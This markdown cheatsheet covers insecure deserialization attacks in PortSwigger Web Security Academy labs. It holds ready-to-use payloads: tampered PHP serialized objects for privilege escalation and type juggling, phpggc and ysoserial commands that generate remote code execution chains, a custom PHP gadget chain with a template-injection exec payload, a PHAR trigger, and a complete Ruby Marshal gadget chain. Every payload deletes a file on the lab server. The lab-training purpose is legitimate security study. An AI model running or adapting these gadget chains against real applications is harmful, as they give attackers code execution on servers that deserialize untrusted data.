# ⚡ Insecure Deserialization Cheatsheet

Complete exploitation methodologies, gadget chain construction, and payloads for PHP, Java, Ruby, custom object injection, and PHAR deserialization labs in PortSwigger Web Security Academy.

---

## 📌 Core Mechanisms & Identification

* **PHP:** Look for serialized string structures like `O:4:"User":2:{s:8:"username";s:5:"carlos";...}` or base64-encoded session cookies.
* **Java:** Look for serialized byte streams starting with magic bytes `rO0` in base64 (`rO0AB...`) or `ac ed 00 05` in hex.
* **Ruby:** Serialized object patterns often start with `\x04\x08` or base64 streams containing Ruby class wrappers (`BAh...`).

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Basic Object Modification & Type Bypasses

**Modifying serialized objects**
Tamper with serialized object attributes directly in session cookies to escalate privileges (e.g., changing `admin` boolean attribute from `0` to `1`):

```text
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

**Modifying serialized data types**
Abuse PHP loose comparison operators (`==`) by changing expected string tokens to integer `0` (e.g., `"access_token"` to `i:0`), causing `'secret_token' == 0` to evaluate as `true`:

```text
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}
```

**Using application functionality to exploit insecure deserialization**
Modify object attributes to trigger logic flaws in application methods during garbage collection or session destruction (e.g., modifying `avatar_link` to target arbitrary local files like `/home/carlos/morale.txt`):

```text
O:4:"User":3:{s:8:"username";s:6:"wiener";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";s:5:"admin";b:1;}
```

---

### 2. PHP Deserialization & Gadget Chains

**Arbitrary object injection in PHP**
Inject a custom class with active magic methods (`__destruct()`, `__wakeup()`) to perform arbitrary file deletion or manipulation:

```text
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

**Exploiting PHP deserialization with a pre-built gadget chain**
Leverage tools like `phpggc` to generate remote code execution (RCE) chains (e.g., Symfony/PHPGGC) and sign them using leaked application secret keys:

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
```

**Developing a custom gadget chain for PHP deserialization**
Chain magic methods (`__wakeup()` -> `__toString()` -> `__get()`) across application classes to invoke privileged sinks (e.g., executing SQL queries or file system actions):

```text
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

**Using PHAR deserialization to deploy a custom gadget chain**
Trigger PHP deserialization without direct `unserialize()` calls by abusing stream wrappers (`phar://`) inside image/file processing functions (`file_exists()`, `getimagesize()`):

```php
class CustomTemplate {}
class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```
*GET /cgi-bin/avatar.php?avatar=phar://wiener

---

### 3. Java & Ruby Deserialization

**Exploiting Java deserialization with Apache Commons**
Generate signed/unsigned Java deserialization payloads targeting vulnerable dependencies using `ysoserial`:

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0
```

**Developing a custom gadget chain for Java deserialization**
Analyze application source/bytecode to map reflection sinks and construct custom object chains executing database queries or system commands:

```text
// Inject serialized object carrying tailored payload properties
java.lang.reflect.Proxy -> ProductCatalog -> Arbitrary SQL Injection Sink
```

**Exploiting Ruby deserialization using a documented gadget chain**
Exploit Ruby deserialization (`Marshal.load`) using pre-built gadget chains (e.g., targeting `Gem::Requirement` or `Universal` chains) to achieve RCE:

```ruby
Gem::SpecFetcher
Gem::Installer

require "base64"

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```

---
